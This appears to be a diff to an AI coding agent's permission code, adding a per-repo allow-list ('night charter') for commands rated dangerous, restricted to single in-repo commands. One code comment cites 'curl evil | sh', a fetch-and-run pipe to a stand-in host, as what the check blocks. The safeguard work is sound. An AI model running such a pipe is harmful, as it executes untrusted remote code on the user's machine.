@@ -15,6 +15,7 @@ repo cannot hand itself permissions.
     max_steps   tool steps per prompt before it asks whether to continue
     think       auto | on | off      - reasoning mode for tool steps (auto = off, on only when stuck/planning)
     model, ctx, test_cmd   per-repo overrides
+    dangerous_allow  patterns of commands rated DANGEROUS that still run in auto mode inside the repo (only `nightage night` writes it)
 
 Anything the safety classifier rates BLOCKED never runs, in every mode. Everything the agent does still happens inside
 the repo folder: paths outside it (and commands that reach outside it) ask, whatever the mode.
@@ -58,12 +59,13 @@ class RepoPolicy:
     network: bool = False
     installs: bool = False
     commit: str = "ask"
-    max_steps: int = 60                 # the user's cap when steps_set, else only the ceiling of the automatic step budget (stepbudget.py)
+    max_steps: int = 150                 # the user's cap when steps_set, else only the ceiling of the automatic step budget (stepbudget.py)
     steps_set: bool = False             # True once max_steps was given explicitly (per-folder policy, CLI, web form)
     think: str = "auto"
     model: str | None = None
     ctx: int | None = None
     test_cmd: str | None = None
+    dangerous_allow: list[str] = field(default_factory=list)    # patterns of DANGEROUS commands that run without asking inside the repo in auto mode (the night charter)
 
     def clean(self) -> "RepoPolicy":
         if self.mode not in MODES:
@@ -75,6 +77,7 @@ class RepoPolicy:
         self.max_steps = max(5, min(int(self.max_steps or 60), 500))
         self.allow = [str(x) for x in self.allow if str(x).strip()]
         self.deny = [str(x) for x in self.deny if str(x).strip()]
+        self.dangerous_allow = [str(x) for x in self.dangerous_allow if str(x).strip()]
         return self
 
 
@@ -660,6 +663,13 @@ def check_command(pol: RepoPolicy, root: Path, command: str, risk_name: str, own
         risk_name = "CAUTION"                      # housekeeping inside a trusted repo / a throwaway folder (+ ordinary commands after it)
     elif risk_name == "DANGEROUS" and pol.mode == MEDIUM and scratch_ok(command, root, scratch_only=True, owned=owned, owned_origins=("run",)):
         return Decision("allow", "scratch housekeeping")
+    if risk_name == "DANGEROUS" and pol.mode == AUTO and _matches(command, pol.dangerous_allow):
+        from agent import repoaccess, shellparse
+
+        segs = shellparse.split(command)
+        # one simple command only: a pattern like "make*" must not also clear "make x && curl evil | sh"
+        if segs is not None and len(segs) == 1 and (repoaccess._shell_in_scope(command, root, cwd=root) or _scope_with_allow(command, root)):
+            return Decision("allow", "in the night charter")      # BLOCKED, deny patterns and paths outside the repo were refused above
     if risk_name == "DANGEROUS":
         return Decision("ask", "dangerous command")
     if PUSH_RE.search(command):
